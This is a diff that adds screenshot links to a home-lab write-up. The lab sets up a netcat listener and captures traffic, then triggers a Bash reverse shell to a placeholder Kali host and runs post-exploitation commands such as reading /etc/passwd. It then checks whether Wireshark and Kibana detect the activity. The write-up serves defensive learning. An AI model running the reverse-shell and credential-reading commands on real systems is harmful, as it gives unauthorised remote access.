@@ -45,7 +45,7 @@ The SIEM configuration used in this lab is the same logging setup used in the pr
 ```
 nc -lvnp 4444
 ```
-
+![Step 1 port listening](port-listening.jpeg)
 ---
 
 ---
@@ -58,8 +58,9 @@ nc -lvnp 4444
 
 ```
 sudo tcpdump -i ens33 -w /home/h4cker_fawad/lab3_ghostshell_capture.pcap
-```
 
+```
+![step2-packet-capture-wireshark.png](port-capturing.jpeg)
 ---
 
 ---
@@ -71,7 +72,8 @@ sudo tcpdump -i ens33 -w /home/h4cker_fawad/lab3_ghostshell_capture.pcap
 ```
 bash -i >& /dev/tcp/<kali-ip>/4444 0>&1
 ```
-
+![ Reverse shell triggered ](remote-access.jpeg)
+---
  This causes Bash to create an outbound TCP connection to the Kali listener.
 
  Once the connection is established, the attacker can interact with the Bash process through the Netcat listener.
@@ -92,7 +94,9 @@ hostname
 cat /etc/passwd
 ls -la /home
 ```
+![Step 4 — Post-exploitation commands run from Kali, through the shell](post-exploitation-access.jpeg)
 
+---
  These commands were used to confirm that the connection provided interactive command execution on the victim.
 
 ---
@@ -114,7 +118,7 @@ ls -la /home
 ```
 tcp.port == 4444
 ```
-
+![wireshark  pcap filtered](pcap-analysis.jpeg)
 ---
 
 ---
@@ -222,7 +226,7 @@ message: "nc"
 ```
 message: "bash"
 ```
-
+![Kibana response](kibana-output.jpeg)
 ---
 
  **Result: no relevant matches returned.**
